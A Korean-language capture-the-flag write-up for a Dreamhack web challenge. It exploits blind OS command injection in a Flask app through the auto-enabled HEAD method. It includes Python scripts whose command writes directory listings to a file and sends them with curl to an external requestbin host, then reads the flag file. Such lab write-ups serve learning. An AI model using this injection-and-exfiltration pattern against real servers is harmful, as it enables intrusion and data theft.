created: 2026-01-24 04:22
category: #web 
link: https://dreamhack.io/wargame/challenges/73

# Write-up
```python
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/' , methods=['GET'])
def index():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "?cmd=[cmd]"

    if request.method == 'GET':
        ''
    else:
        os.system(cmd)
    return cmd

app.run(host='0.0.0.0', port=8000)
```
- 코드는 정말 단순하다...

우선 OS command injection 공격을 하려면 **else 조건문**이 실행되게 해야했다. 하지만 `@app.route('/', methods=['GET'])`으로 되어 있고 조건문도 `if request.method == 'GET'`으로 되어 있어서 처음에는 무조건 HTTP GET으로만 요청 할 수 있는데 어떻게 else 조건문이 실행될 수 있지? 라고 생각하였다.
그래서 뭔가 숨겨진 내용이 없을까하고 `@app.route()` 데코레이터에 대해서 좀 더 살펴보았다. 

Flask 공식문서에서 다음과 같은 내용을 확인할 수 있었다. 
> If `GET` is present, Flask automatically adds support for the `HEAD` method and handles `HEAD` requests according to the [HTTP RFC](https://www.ietf.org/rfc/rfc2068.txt).
- 위 내용과 같이 `HEAD` 메서드까지 자동으로 추가해준다고 한다. 

따라서 정말로 `HEAD` 메서드를 통해서 OS command가 실행되는지 확인하고자 했다. `sleep` 함수를 통해서 지연을 확인해보면 쉽게 확인할 수 있을 것 같았다. 
다음과 같이 python 스크립트를 통해서 확인하였다.
```python
import requests

cmd = "sleep 5"
url = f"http://host3.dreamhack.games:11480?cmd={cmd}"

response = requests.head(url)

print(response.status_code)
```
- 실행해보니 정말로 약 5초 뒤에 응답이 왔었다. `ls` 같은 명령어로 대체했을 땐 거의 곧 바로 응답이 왔다. 따라서 리눅스 명령어 실행까지는 성공하였다.
- 하지만 결국 어디에 있는지도 모르는 플래그 파일을 찾고 출력까지 해야하는데, API가 응답하는 건 내가 전달한 `cmd` 쿼리 파라미터 값밖에 없고, 심지어 HTTP HEAD 메서드에서는 응답 내용을 알 수도 없는 것 같았다. 

그래서 타겟 서버에서 리눅스 명령어 실행까지는 되니까, 명령어 실행 결과를 묶어서 `curl` 등으로 외부 웹 사이트 등에 전송하는 방법을 생각했다. 이것을 보통 OAST 공격이라고 하는 것 같다. 

Dreamhack에서 이를 도와주는 도구를 제공한다. 주기적으로 생성되는 url에 요청을 전송하면, 요청된 내용이 나타난다.
- https://tools.dreamhack.games/requestbin/
- https://lmhbyhx.request.dreamhack.games (링크는 15분마다 바뀜)

따라서 명령어 실행 결과를 해당 링크로 전송하면 될 것이다. 다음과 같이 python 스크립트를 수정했다. 
```python
import requests

cmd = "ls >> result.txt; curl -X POST -d @result.txt https://glmoqmn.request.dreamhack.games"
url = f"http://host3.dreamhack.games:11480?cmd={cmd}"

response = requests.head(url)

print(response.status_code)
```
- 이런 식으로 `cmd`의 내용만 바꿔주었다. 
- `result.txt`에다가 명령어 실행 결과를 쓰고 `curl` 명령어에서 해당 파일 내용을 `-d` 옵션으로 전송한다.
- `ls >> result.txt`로 `result.txt` 파일에 append 형식으로 명령어 결과를 추가한다. 

실행 이후 `/app/flag.py` 파일이 존재한다는 것을 알게 되었다. 따라서 `cmd` 문자열에서 "ls"를 "cat /app/flag.py"로 바꿔주고 나서 실행하였고 정상적으로 플래그를 획득할 수 있었다.

# Reference
- https://portswigger.net/web-security/os-command-injection
- https://www.hahwul.com/ko/sec/web-hacking/oast/
- https://flask.palletsprojects.com/en/stable/quickstart/
- https://curl.se/docs/manpage.html#--data
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Methods
- https://hacktagon.github.io/iot/system/persu/Blind-OSCommandInjection_Persu